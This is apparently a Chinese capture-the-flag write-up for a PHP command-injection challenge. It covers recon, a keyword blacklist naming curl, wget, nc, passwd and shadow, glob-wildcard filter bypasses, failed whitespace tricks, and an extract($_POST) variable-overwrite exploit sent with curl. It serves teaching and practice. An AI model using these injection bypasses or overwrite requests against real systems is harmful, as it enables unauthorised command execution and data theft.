# web_growcode 完整 writeup

## 0. 开局

访问题目只有一个页面：白底黑字，一段 7 行的 PHP 源码，像浏览器直接打开代码文件的样子。代码逻辑一目了然：

```php
$cmd = $_GET['cmd'] ?? '';
system($cmd);
```

先做常规侦察：

```
?cmd=ls        → index.php
?cmd=ls -la    → index.php，权限 600 root（读不了）
?cmd=whoami    → www-data
?cmd=pwd       → /app
?cmd=ls /      → 发现根目录有个 /flag
```

常规指令都能执行，看起来"源码即全部"。

## 1. 第一层：打破"源码即全部"

```
?cmd=cat /flag
```

回显：`检测到敏感关键字，请求已被拦截（分隔符与特殊字符同样在监控范围内）`。

同时注意页面：**源码变长了**。在 `$cmd` 赋值和末尾的 `system()` 之间多出了一段新代码——一份敏感词黑名单正则和对应的拦截逻辑，行号无缝衔接，样式完全一致——原来代码不止刚才那些。这就是本题机制：页面按你触发的深度揭示源码，被拦的不是玄学，是这段新长出来的代码。

## 2. 第二层：读黑名单，用通配符拆词

新长出的代码给出完整黑名单：

```
/flag|cat|tac|nl|head|tail|more|less|sort|strings|rev|base64|xxd|hexdump|grep|sed|awk|env|printenv|export|proc|passwd|shadow|secret|uname|curl|wget|nc|php/i
```

黑名单匹配的是明文子串，通配符可以拆开它们（glob 由 shell 在执行前展开，不经过 PHP 的正则）：

```
?cmd=/bin/ca? /fla?
```

读到 `/flag`：

```
flag{y0u_f0und_a_d3c0y_n0t_th3_r3al_0ne}
这不是真正的通关凭证。
它不在磁盘上，也不在环境变量里——
它只存在于正在运行的那段代码的内存里。
```

假 flag + 指引：真凭证不在文件里，也不在环境变量里（`/proc` 那条路可以死心了），它属于正在运行的代码本身——把注意力收回页面上的源码。

## 3. 第三层：分隔符试探撞上极限模式

```
?cmd=ls / | grep fla
```

又长出一段新代码：**去除所有空白字符 + 命令长度限制 16**。空格直接没了，两词命令全部报废——而且回显区会把去空白后的命令原样摆给你看，改写过程不再是黑盒：

```
> ls -la | wc
[去空白后] ls-la|wc
sh: ls-la: not found
```

亲眼看到空格被吃掉，下一步自然就是"没有空格怎么传参"。而带管道/重定向的输入都会先命中这一层的触发。

免空格绕过的常规套路在这里全部失效：

- `${IFS}` 需要 `$`（见下一层）
- 花括号展开 `{cat,/flag}` 是 bash 特性，容器的 busybox ash 不支持
- 免空格重定向 `ca?</fla?` 在 busybox ash 下连通配符都不展开（实测 `cat</fla?` 报 can't open），此路不通

L3 就是纯粹的墙：它不提供出路，只把你的注意力推向"更特殊的语法"。

## 4. 第四层：终局揭示与变量覆盖

```
?cmd=${IFS}
```

（带 `$`/`` ` ``/`{` 的输入，或任何带 POST 体的请求）触发最后一段代码——完整防御逻辑：

```php
$auth = false;

// 从 POST 数据中还原参数（注意：会覆盖同名变量）
extract($_POST);

if (preg_match($blacklist, $cmd) || strlen($cmd) > 16) {
    exit('检测到敏感关键字或长度超限，请求已被拦截');
}

if ($cmd === 's' && $auth === 'admin') {
    exit($REAL_FLAG);
}

system($cmd);
```

审计要点：

1. `$auth` 先被置 `false`，随后 `extract($_POST)` 把 POST 键值**直接还原为同名变量**——发一个 `auth=admin`，`$auth` 就被覆盖成 `admin`；
2. 通关条件 `cmd === 's'`：单字符命令，天然满足 v3 的 16 字符限制（这就是"地址栏短指令"）；
3. `$REAL_FLAG` 没有在任何展示代码中定义——它只存在于脚本运行时的内存里（平台注入的环境变量在启动时被读进内存，进程环境随即清除）。

## 5. 拿 flag

构造复合请求：地址栏短指令 + 数据包密钥：

```
GET /?cmd=s
POST auth=admin
```

```bash
curl -X POST 'http://<host>:<port>/?cmd=s' -d 'auth=admin'
```

回显真 flag。步骤化 PoC 见 [exp.py](exp.py)。

## 6. 为什么偷不到（给不服气的你）

- `/proc/self/environ`：命令经 `su` 降权到 `www-data` 执行，读 root 进程的 environ 是 Permission denied；读自己（降权 shell）的 environ——`FLAG` 在脚本启动时已被 `putenv` 清除，是空的。
- 读源码找引擎逻辑：`index.php` 权限 600，www-data 读不了；`paste index.php` 这类未拉黑读取器同样死于权限。
- `set`/`env` 打环境变量：同上，进程环境里没有 FLAG。
- 变量覆盖覆盖 `$REAL_FLAG` 自己？可以，但那只是自毁通关条件。

flag 唯一的出口就是那条通关分支。
